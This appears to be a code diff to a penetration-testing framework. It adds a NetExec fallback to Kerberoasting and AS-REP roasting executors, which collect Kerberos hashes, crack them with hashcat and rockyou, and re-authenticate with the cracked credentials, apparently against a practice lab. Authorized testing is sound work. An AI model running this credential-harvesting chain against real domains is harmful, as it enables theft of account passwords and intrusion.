@@ -32,11 +32,25 @@ from typing import Any, Optional
 from ..recommend import ParamSpec, ParamValue, values
 from .. import proof
 from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
-                   redact_argv)
+                   redact_argv, ToolAttempt, first_successful)
 
 
 # Default Kali wordlist (claude-mem #66146 cracked against rockyou).
 DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+
+def _nxc_auth_flags(cfg) -> list[str]:
+    """NetExec auth flags from the operator config (mirrors probes._nxc_auth):
+    ``-u <user>`` then ``-H <nthash>`` / ``--aesKey <key>`` / ``-p <pass>``."""
+    argv = ["-u", cfg.username or ""]
+    if cfg.nt_hash:
+        argv += ["-H", cfg.nt_hash]
+    elif cfg.aes_key:
+        argv += ["--aesKey", cfg.aes_key]
+    elif cfg.password is not None:
+        argv += ["-p", cfg.password]
+    return argv
+
 
 # nxc re-auth success markers (domain creds accepted by the DC).
 _RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
@@ -92,6 +106,30 @@ class _RoastExecutor(ValidationExecutor):
                     op_target: str, op_extra: list[str]) -> list[str]:
         raise NotImplementedError
 
+    # D2 light fallback (ADR-002 D2): the NetExec roast flag differs per subclass
+    # (--kerberoasting | --asreproast); the invocation is otherwise shared.
+    _nxc_roast_flag = ""            # '--kerberoasting' (KERBEROAST) | '--asreproast' (ASREP)
+
+    def _nxc_fallback_argv(self, ctx: ExecutorContext, principal: str,
+                           out_dir) -> list[str]:
+        """NetExec roast fallback when the impacket primary is absent/hung.
+
+        UNVERIFIED invocation (flag for lab-pinning):
+
+            nxc ldap <dc_ip> -d <domain> -u <user> (-p <pass> | -H <hash> |
+                --aesKey <key>) <--kerberoasting|--asreproast> <outdir>/<tech>_<principal>.nxc
+
+        Auth flags mirror ``probes._nxc_auth``. Both impacket and nxc emit the
+        SAME ``$krb5tgs$`` / ``$krb5asrep$`` hash format to stdout, so the shared
+        ``self.hash_re`` success predicate + the downstream
+        ``self.hash_re.findall(winning_res.stdout)`` extraction work for whichever
+        tool won.
+        """
+        cfg = ctx.config
+        outfile = Path(out_dir) / f"{self.technique_class}_{principal}.nxc"
+        return ["nxc", "ldap", cfg.dc_ip, "-d", cfg.domain, *_nxc_auth_flags(cfg),
+                self._nxc_roast_flag, str(outfile)]
+
     def target_identity(self, ctx, finding, params) -> dict[str, Any]:  # overridden
         raise NotImplementedError
 
@@ -139,13 +177,27 @@ class _RoastExecutor(ValidationExecutor):
             steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                     returncode=res.returncode, note=note))
 
-        # 1) roast -> hash blob --------------------------------------------
-        roast_argv = self._roast_argv(ctx, principal, op_target, op_extra)
-        res = ctx.runner.run(roast_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
+        # 1) roast -> hash blob (D2 light fallback: impacket -> nxc) --------
+        # Both tools emit the same $krb5tgs$/$krb5asrep$ blob, so one positive
+        # predicate serves both; an absent/hung primary falls through to nxc, a
+        # clean primary negative is trusted but nxc is still tried.
+        def _has_hash(r: RunResult) -> bool:
+            return bool(self.hash_re.findall(r.stdout or ""))
+
+        attempts = [
+            ToolAttempt(self._roast_tool,
+                        self._roast_argv(ctx, principal, op_target, op_extra),
+                        success=_has_hash, cwd=str(out_dir)),
+            ToolAttempt("nxc",
+                        self._nxc_fallback_argv(ctx, principal, out_dir),
+                        success=_has_hash, cwd=str(out_dir)),
+        ]
+        att, res, _roast_won = first_successful(ctx.runner, attempts,
+                                                timeout=cfg.tool_timeout_s)
         hashes = self.hash_re.findall(res.stdout or "")
         roast_ok = bool(hashes)
-        record("roast", roast_argv, res, roast_ok,
-               note=f"{len(hashes)} hash(es)" if roast_ok else "no hash")
+        record("roast", att.argv, res, roast_ok,
+               note=(f"via {att.tool}; {len(hashes)} hash(es)" if roast_ok else "no hash"))
         if not roast_ok:
             errors.append("roast_no_hash")
             return self._artifact(steps, gate, mutation, None, False, errors)
@@ -221,6 +273,7 @@ class KerberoastExecutor(_RoastExecutor):
     hashcat_mode = "13100"
     hash_re = re.compile(r"\$krb5tgs\$[^\s]+")
     _roast_tool = "impacket-GetUserSPNs"
+    _nxc_roast_flag = "--kerberoasting"
     _hash_name = "$krb5tgs$"
     recipe_ref = ("#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ "
                   "-> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)")
@@ -244,6 +297,7 @@ class ASREPExecutor(_RoastExecutor):
     hashcat_mode = "18200"
     hash_re = re.compile(r"\$krb5asrep\$[^\s]+")
     _roast_tool = "impacket-GetNPUsers"
+    _nxc_roast_flag = "--asreproast"
     _hash_name = "$krb5asrep$"
     recipe_ref = ("#66146 ASREP = impacket-GetNPUsers -request -> hashcat -m 18200 "
                   "-> reauth (PROVED brandon.stark + missandei)")
